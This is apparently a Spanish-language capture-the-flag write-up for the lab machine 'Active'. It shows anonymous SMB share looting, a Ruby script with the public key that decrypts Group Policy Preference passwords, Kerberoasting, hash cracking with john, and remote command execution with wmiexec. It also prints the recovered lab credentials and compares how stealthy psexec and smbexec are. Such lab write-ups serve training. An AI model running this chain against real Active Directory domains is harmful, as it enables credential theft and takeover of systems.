---
title: "Active"
---

# Active

```bash
smbclient //10.10.10.100/Replication -N
```

Para descargar una carpeta de forma recursiva en smb:

```bash
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
```

El archivo `groups.xml`

Suele contener credenciales
```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
```

Esta contraseña encriptada se conoce como una **contraseña de preferencias de política de grupo (GPP)**. Microsoft usó una clave simétrica para encriptar estas contraseñas, y la **clave** fue **revelada públicamente**.

```ruby
#!/usr/bin/ruby
require 'rubygems'
require 'openssl'
require 'base64'

unless ARGV.length == 1
  puts "Usage: #{File.basename($0)}: encrypted_data"
  exit
end

encrypted_data = ARGV[0]

#encrypted_data = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

def decrypt(encrypted_data)
padding = "=" * (4 - (encrypted_data.length % 4))
epassword = "#{encrypted_data}#{padding}"
decoded = Base64.decode64(epassword)

key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
aes.decrypt
aes.key = key
plaintext = aes.update(decoded)
plaintext << aes.final
pass = plaintext.unpack('v*').pack('C*') ## UNICODE conversion

return pass
end

blah = decrypt(encrypted_data)
puts blah
```

Luego hacemos kerberoasting con las creds obtenidas:

```python
GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
```

Se obtiene el hash del administrador y se rompe por fuerza bruta

```bash
john -w=/usr/share/wordlists/rockyou.txt hash
```

No podemos conectarnos con evil-winrm, pero netexec nos tira pwned:

```bash
netexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -d active.htb
```

Asi que 

```python
wmiexec.py 'Administrator:Ticketmaster1968@10.10.10.100'
```

- **psexec.py** es una herramienta poderosa que permite la ejecución de comandos con privilegios de SYSTEM, pero deja rastros evidentes en el sistema remoto, como la creación de un binario y un servicio. Sin embargo, realiza una limpieza automática si la sesión se cierra correctamente, lo que puede ayudar a minimizar su huella.
    
- **smbexec.py**, por otro lado, no crea un binario, lo que puede hacerla menos detectable. Sin embargo, al igual que psexec.py, crea un servicio en el sistema remoto. Aunque realiza una limpieza automática, si el comando falla antes de la limpieza, los archivos no se eliminarán, dejando artefactos en el sistema remoto. Además, smbexec.py tiene la limitación de que solo puede utilizar rutas absolutas. Esto significa que todos los comandos deben especificar la ruta completa al archivo o directorio que quieren acceder, lo que puede ser un inconveniente en algunos casos.
